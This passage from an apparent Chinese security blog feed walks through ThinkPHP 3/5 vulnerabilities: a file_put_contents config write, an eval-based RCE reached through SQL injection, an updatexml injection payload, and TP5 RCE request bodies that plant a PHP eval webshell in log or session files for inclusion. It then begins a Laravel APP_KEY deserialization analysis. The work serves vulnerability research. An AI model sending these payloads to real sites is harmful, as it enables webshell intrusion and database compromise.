phpinfo();?&gt;</code></pre><p>成功写入config.php文件，访问Addons/Example/config.php</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/2/8.png" alt="" loading="lazy"></p><p>所以，在TP3开发的源码中，全局查找file_put_contents很容易中奖。</p><h4 id="Auth引发的RCE"><a href="#Auth引发的RCE" class="headerlink" title="Auth引发的RCE"></a><strong>Auth引发的RCE</strong></h4><p>在tp3中，在Auth的getAuthList方法存在eval函数，跟进代码ThinkPHP\Library\Think\Auth.class.php</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/7.png" alt="" loading="lazy"></p><p>这里需要满足$command变量可控就可以rce了，$command为[表前缀]_auth_rule的condition字段，这里我还是以yershop源码来分析，控制权限的表为yershop_auth_rule。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/8.png" alt="" loading="lazy"></p><p>所以，漏洞触发需要向condition字段写入我们的恶意代码，要利用注入且支持pdo就能写入进去，tp3是以pdo来连接数据库的，这里满足了pdo，就需要寻找注入点来getshell了。</p><p>在文件Application\Home\Controller\OrderController.class.php中的detail方法，通过<strong>I</strong>方法获取id参数。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/9.png" alt="" loading="lazy"></p><p>利用pdo修改condition字段</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/10.png" alt="" loading="lazy"></p><p>继续分析，是怎么调用到getAuthList这个方法的，在Application\Admin\Controller\AdminController.class.php控制器中，调用了checkRule方法，在checkRule方法实列了Auth类，并调用了check方法。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/11.png" alt="" loading="lazy"></p><p>跟进check方法</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/12.png" alt="" loading="lazy"></p><p>在104行调用了我们的getAuthList方法，执行到了eval函数处。要触发rce，从代码中可以看到需要普通用户的权限才会执行到checkRule方法，所以先添加一个新用户并新增一个用户组，给它文章管理的权限。</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/13.png" alt="" loading="lazy"></p><p>登录这个用户，访问我们注入修改的路由，成功rce</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/14.png" alt="" loading="lazy"></p><h4 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a><strong>SQL注入</strong></h4><p>在TP3.1.3和TP3.2.3注入都差不多，无非就表达式注入，bind注入，find/select/delete注入，order注入，在之前的<a href="https://bbs.ichunqiu.com/thread-56035-1-1.html" target="_blank" rel="noopener">文章</a>中，分析过关于tp3.2.3的注入，这里我就不在多说了。这里主要是TP5的注入。</p><h5 id="ThinkPHP-lt-5-0-16-insert-update注入"><a href="#ThinkPHP-lt-5-0-16-insert-update注入" class="headerlink" title="ThinkPHP&lt;=5.0.16 insert/update注入"></a><strong>ThinkPHP&lt;=5.0.16 insert/update注入</strong></h5><p>在ThinkPHP5中，获取请求方式的方法是input，在控制器中，写个存在漏洞的demo</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">getuser</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">input</span><span class="token punctuation">(</span><span class="token string">'get.username/a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$user</span> <span class="token operator">=</span> <span class="token function">db</span><span class="token punctuation">(</span><span class="token string">'user'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">where</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'uid'</span><span class="token operator">=</span><span class="token operator">></span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token operator">=</span><span class="token operator">></span><span class="token variable">$username</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">dump</span><span class="token punctuation">(</span><span class="token variable">$user</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>漏洞payload</p><pre><code>username[0]=dec&amp;username[1]=updatexml(1,concat(0x7e,user(),0x7e),1)&amp;username[2]=1</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/17.png" alt="" loading="lazy"></p><p>在user变量处，断点进行分析，直接进入update方法</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/18.png" alt="" loading="lazy"></p><p>继续跟进$this-&gt;builder-&gt;update</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/19.png" alt="" loading="lazy"></p><p>在parseData方法中，进行了sql语句的拼接</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/thinphp/20.png" alt="" loading="lazy"></p><p>当参数传入数组的时候，下标0为exp时候，直接返回下标为1的参数值，而为inc或者dec时候，通过parseKey方法处理了下标为1的参数值，跟进查看parseKey方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">parseKey</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string">'$.'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token boolean">false</span> <span class="token operator">===</span> <span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string">'('</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">// JSON字段支持</span>            <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$field</span><span class="token punctuation">,</span> <span class="token variable">$name</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'$.'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$key</span>                <span class="token operator">=</span> <span class="token string">'json_extract('</span> <span class="token punctuation">.</span> <span class="token variable">$field</span> <span class="token punctuation">.</span> <span class="token string">', \'$.'</span> <span class="token punctuation">.</span> <span class="token variable">$name</span> <span class="token punctuation">.</span> <span class="token string">'\')'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">elseif</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[,\'\"\(\)`\s]/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token function">list</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token string">'__TABLE__'</span> <span class="token operator">==</span> <span class="token variable">$table</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getTable</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'alias'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$table</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token variable">$options</span><span class="token punctuation">[</span><span class="token string">'alias'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token variable">$table</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[,\'\"\*\(\)`.\s]/'</span><span class="token punctuation">,</span> <span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string">'`'</span> <span class="token punctuation">.</span> <span class="token variable">$key</span> <span class="token punctuation">.</span> <span class="token string">'`'</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$table</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token variable">$table</span> <span class="token operator">=</span> <span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'`.`'</span><span class="token punctuation">,</span> <span class="token variable">$table</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string">'`'</span> <span class="token punctuation">.</span> <span class="token variable">$table</span> <span class="token punctuation">.</span> <span class="token string">'`.'</span> <span class="token punctuation">.</span> <span class="token variable">$key</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> <span class="token variable">$key</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>然而parseKey并没有对传入的字符进行任何过滤，所以当输入exp，inc，dec，都返回的字符串，为什么参数值为exp的时候不能产生注入，原因是在用input方法传入的时候，要经过filterExp进行过滤</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">filterExp</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$value</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// 过滤查询特殊字符</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT LIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$value</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token string">' '</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">// TODO 其他安全过滤</span>    <span class="token punctuation">}</span></code></pre><p>当匹配到exp的时候，就会在exp后面添加一个空格，导致不能同parseKey方法中的exp相等。同样，利用insert方法向数据库插入数据也是同种原理。由于篇幅问题，网上的分析文章也多，之后的注入不想再造轮子了，可以详细看这个师傅的文章：<a href="https://github.com/Mochazz/ThinkPHP-Vuln。" target="_blank" rel="noopener">https://github.com/Mochazz/ThinkPHP-Vuln。</a></p><h4 id="TP5-rce漏洞"><a href="#TP5-rce漏洞" class="headerlink" title="TP5 rce漏洞"></a><strong>TP5 rce漏洞</strong></h4><p>TP5的rce漏洞影响版本：ThinkPHP 5.0.x ~ 5.0.23、ThinkPHP 5.1.x ~ 5.1.31、ThinkPHP 5.2.0beta1</p><p>TP5rce的分析网上也比较多了，我这里有也不造轮子了，主要说下在TP渗透，php7版本的关于log文件和session文件包含的问题。</p><h5 id="runtime文件包含拿shell"><a href="#runtime文件包含拿shell" class="headerlink" title="runtime文件包含拿shell"></a><strong>runtime文件包含拿shell</strong></h5><p>先写入一句话到runtime日志中，POST发送</p><pre><code>_method=__construct&amp;method=get&amp;filter[]=call_user_func&amp;server[]=phpinfo&amp;get[]=&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;</code></pre><p>runtime的日志文件为./runtime/log/202008/17.log</p><pre><code>_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;server[]=phpinfo&amp;get[]=../runtime/log/202008/17.log&amp;cmd=phpinfo();</code></pre><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/19.png" alt="" loading="lazy"></p><h5 id="session文件包含拿shell"><a href="#session文件包含拿shell" class="headerlink" title="session文件包含拿shell"></a><strong>session文件包含拿shell</strong></h5><p>写入session文件</p><pre><code>_method=__construct&amp;filter[]=think\Session::set&amp;method=get&amp;get[]=&lt;?php eval($_POST[&#39;cmd&#39;])?&gt;&amp;server[]=1</code></pre><p>一般linux下的session文件存储在/var/lib/php/session，session的命名为sess_[PHPSESSID]</p><pre><code>_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;get[]=/var/lib/php/session/sess_sf9vlodcl4j4r1bhli2ddnvr32&amp;server[]=1&amp;cmd=phpinfo();</code></pre><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/5/20.png" alt="" loading="lazy"></p><p>其实也可以用反序列化的点来，只是有点麻烦，需要去调代码。</p><pre><code>_method=__construct&amp;filter=unserialize&amp;method=get&amp;server[REQUEST_METHOD]=序列化</code></pre><h4 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a><strong>反序列化</strong></h4><p>反序列化点通常都是在代码审计当中被发现的，当unserialize可控时可以触发，但是只光靠unserialize可控很难找到可控点，这时安全研究员<strong>Sam Thomas</strong>分享了一个关于phar反序列的漏洞，大大增加了反序列化的利用点。由于TP5-6的反序列化分析篇幅比较大，可以直接看我博客：</p><p>Thinkphp5.0.24反序列：<a href="https://jfanx1ng.github.io/2020/05/07/ThinkPHP5.0.24反序列化漏洞分析/" target="_blank" rel="noopener">https://jfanx1ng.github.io/2020/05/07/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p><p>Thinkphp5.1.x反序列：<a href="https://jfanx1ng.github.io/2020/05/09/ThinkPHP5.1.x反序列化链分析/" target="_blank" rel="noopener">https://jfanx1ng.github.io/2020/05/09/ThinkPHP5.1.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</a></p><p>Thinkphp6.x反序列：<a href="https://jfanx1ng.github.io/2020/05/13/ThinkPHP6.0反序列化漏洞分析/" target="_blank" rel="noopener">https://jfanx1ng.github.io/2020/05/13/ThinkPHP6.0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p><p>phar反序列化挖掘案列：</p><p><a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=57947&amp;page=1" target="_blank" rel="noopener">https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=57947&amp;page=1</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Runtime日志&quot;&gt;&lt;a href=&quot;#Runtime日志&quot; class=&quot;headerlink&quot; title=&quot;Runtime日志&quot;&gt;&lt;/a&gt;&lt;strong&gt;Runtime日志&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;在ThinkPHP3的版本中，入口文件index.
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Laravel APP_KEY泄露 RCE漏洞分析</title>
    <link href="http://yoursite.com/2020/08/14/LaravelAPP_KEY%E6%B3%84%E9%9C%B2RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <id>http://yoursite.com/2020/08/14/LaravelAPP_KEY%E6%B3%84%E9%9C%B2RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</id>
    <published>2020-08-13T16:00:00.000Z</published>
    <updated>2020-08-14T10:46:06.146Z</updated>
    
    <content type="html"><![CDATA[<p>laravel框架APP_KEY泄露的时候，可以通过cookie和X-XSRF-TOKEN触发反序列化漏洞，影响版本：<strong>5.5.x&lt;=5.5.40、5.6.x&lt;=5.6.29</strong></p><h4 id="环境安装"><a href="#环境安装" class="headerlink" title="环境安装"></a><strong>环境安装</strong></h4><pre><code>composer create-project laravel/laravel laravel5629 --prefer-dist &quot;5.6.0&quot;修改composer.json中的5.6.0为5.6.29更新：composer update在routes/web.php新添加一条路由：Route::post(&#39;/&#39;, function() {return view(&#39;welcome&#39;);});</code></pre><h4 id="通过Cookie反序列化"><a href="#通过Cookie反序列化" class="headerlink" title="通过Cookie反序列化"></a><strong>通过Cookie反序列化</strong></h4><p>跟踪代码app\Http\Middleware\EncryptCookies.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Middleware</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Cookie<span class="token punctuation">\</span>Middleware<span class="token punctuation">\</span>EncryptCookies</span> <span class="token keyword">as</span> Middleware<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">EncryptCookies</span> <span class="token keyword">extends</span> <span class="token class-name">Middleware</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$except</span> <span class="token operator">=</span> <span class="token punctuation">[</span>        <span class="token comment" spellcheck="true">//</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟踪EncryptCookies的父类，vendor\laravel\framework\src\Illuminate\Cookie\Middleware\EncryptCookies.php，找到handle方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> Closure <span class="token variable">$next</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">encrypt</span><span class="token punctuation">(</span><span class="token variable">$next</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进decrypt方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">decrypt</span><span class="token punctuation">(</span>Request <span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cookies</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$cookie</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">isDisabled</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">continue</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cookies</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decryptCookie</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">DecryptException</span> <span class="token variable">$e</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cookies</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">set</span><span class="token punctuation">(</span><span class="token variable">$key</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$request</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这里$request-&gt;cookies进行了遍历，将值传入了decryptCookie方法。继续跟进decryptCookie方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">decryptCookie</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">return</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span>        <span class="token operator">?</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decryptArray</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span>        <span class="token punctuation">:</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">encrypter</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">decrypt</span><span class="token punctuation">(</span><span class="token variable">$cookie</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>上面判断我们传入的是否为数组，不为数组进入到decrypt，跟进vendor\laravel\framework\src\Illuminate\Encryption\Encrypter.php的decrypt方法</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/1.png" alt="" loading="lazy"></p><p>跟进getJsonPayload方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">getJsonPayload</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$payload</span> <span class="token operator">=</span> <span class="token function">json_decode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">validPayload</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">DecryptException</span><span class="token punctuation">(</span><span class="token string">'The payload is invalid.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">validMac</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">DecryptException</span><span class="token punctuation">(</span><span class="token string">'The MAC is invalid.'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token variable">$payload</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>我们传入的payload会解密base64，再转化为json，所以这个iv和value是我们可控的，最终就可以来到第149行进行反序列化操作了。</p><h4 id="通过X-XSRF-TOKEN头反序列化"><a href="#通过X-XSRF-TOKEN头反序列化" class="headerlink" title="通过X-XSRF-TOKEN头反序列化"></a><strong>通过X-XSRF-TOKEN头反序列化</strong></h4><p>跟踪代码app\Http\Middleware\VerifyCsrfToken.php</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">namespace</span> <span class="token package">App<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Middleware</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">Illuminate<span class="token punctuation">\</span>Foundation<span class="token punctuation">\</span>Http<span class="token punctuation">\</span>Middleware<span class="token punctuation">\</span>VerifyCsrfToken</span> <span class="token keyword">as</span> Middleware<span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">VerifyCsrfToken</span> <span class="token keyword">extends</span> <span class="token class-name">Middleware</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$except</span> <span class="token operator">=</span> <span class="token punctuation">[</span>    <span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>跟踪VerifyCsrfToken的父类，vendor\laravel\framework\src\Illuminate\Foundation\Http\Middleware\VerifyCsrfToken.php，找到handle方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">handle</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> Closure <span class="token variable">$next</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">isReading</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span> <span class="token operator">||</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">runningUnitTests</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">||</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">inExceptArray</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span> <span class="token operator">||</span>            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">tokensMatch</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span>        <span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addCookieToResponse</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">,</span> <span class="token variable">$next</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">TokenMismatchException</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span></code></pre><p>继续更进tokensMatch方法</p><pre class=" language-php"><code class="language-php"><span class="token keyword">protected</span> <span class="token keyword">function</span> <span class="token function">tokensMatch</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$token</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">getTokenFromRequest</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">token</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$token</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span>        <span class="token function">hash_equals</span><span class="token punctuation">(</span><span class="token variable">$request</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">session</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">token</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$token</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>继续跟进getTokenFromRequest方法</p><p><img src="https://raw.githubusercontent.com/fanxinglove/bolg-img/master/study/4/2.png" alt="" 